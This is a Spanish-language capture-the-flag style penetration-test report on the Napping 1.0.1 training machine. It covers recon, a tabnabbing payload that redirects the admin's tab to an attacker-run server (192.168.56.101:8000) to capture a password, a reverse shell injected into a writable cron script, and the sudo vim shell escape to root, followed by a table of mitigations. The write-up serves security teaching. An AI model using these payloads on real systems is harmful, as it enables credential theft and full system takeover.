Resumen Ejecutivo

Este reporte describe el proceso completo de auditoría y compromiso de la máquina virtual de entrenamiento Napping 1.0.1. La intrusión progresó desde el descubrimiento inicial de hosts mediante ARP, la explotación de una vulnerabilidad de Tabnabbing en el portal web corporativo para secuestrar las credenciales del administrador, y finalmente la escalada de privilegios a root abusando de un script Python programado en cron y de permisos mal configurados en sudoers (Vim).

Metodología Técnica Aplicada

1. Reconocimiento y Descubrimiento

Utilizando la herramienta netdiscover, se identificó al host objetivo con la IP 192.168.56.103. Posteriormente, un escaneo con Nmap (nmap -A 192.168.56.103) reveló dos puertos abiertos:

  • Puerto 22 (SSH): OpenSSH 8.2p1.
  • Puerto 80 (HTTP): Servidor web Apache 2.4.41.

Se identificó además la ausencia del atributo HttpOnly en las cookies de sesión (PHPSESSID), y mediante DirBuster se mapearon rutas sensibles como register.php, index.php y welcome.php.

2. Compromiso Inicial (Tabnabbing)

Al registrar un usuario y acceder a welcome.php, se encontró un formulario para enviar enlaces. Al no existir restricciones, se descubrió la exposición a Tabnabbing / Tab Hijacking. Se inyectó un payload en HTML (payload.html) que utilizaba: 

window.opener.parent.location.replace('http://192.168.56.101:8000/home.html');

Tras simular la revisión por parte del administrador (daniel), la pestaña original de daniel se redirigió a nuestro servidor malicioso, capturando su contraseña: C@ughtm3napping123. Con estas credenciales se estableció conexión vía SSH.

3. Escalada de Privilegios

Movimiento Lateral (adrian): Se localizó un script de monitoreo en /home/adrian/query.py ejecutado periódicamente como tarea cron. Dado que el grupo al que pertenecía daniel poseía permisos de escritura sobre este script, se inyectó una reverse shell en Python: 

os.system('/usr/bin/bash /dev/shm/connection.sh')

Esto devolvió una consola como el usuario adrian.

Escalada a Root: Al auditar privilegios con sudo -l, se determinó que adrian tenía permiso de ejecutar /usr/bin/vim como root sin contraseña. Se abusó de esta directiva de escape (de acuerdo con GTFOBins) ejecutando: 

sudo /usr/bin/vim -c ':!/bin/sh'

obteniendo control total (root) del sistema.

Tabla de Hallazgos Críticos

ID Hallazgo Vulnerabilidad Severidad Impacto Mitigación Recomendada
VULN-01 Tabnabbing en procesamiento de enlaces Alta Robo de credenciales de administrador mediante redirección forzada. Aplicar rel="noopener noreferrer" en enlaces que usen target="_blank".
VULN-02 Permiso de escritura en script ejecutado en Cron Alta Inyección de código local y escalada horizontal. Restringir la modificación de scripts automatizados al propietario absoluto (chmod 700/755).
VULN-03 Bypass de Sudoers vía Vim interactivo Crítica Escalada total de privilegios a root sin contraseña. Eliminar la regla NOPASSWD para editores de texto interactivos en /etc/sudoers.

Conclusión

El incidente demuestra que fallos aislados que a priori no parecen críticos (como un redireccionamiento de ventana o permisos de grupo mal calculados) pueden encadenarse de manera devastadora. La remediación definitiva requiere un enfoque de defensa en profundidad: mitigar la entrada web, endurecer los permisos del sistema de archivos local y aplicar controles estrictos sobre la ejecución delegada (sudoers).
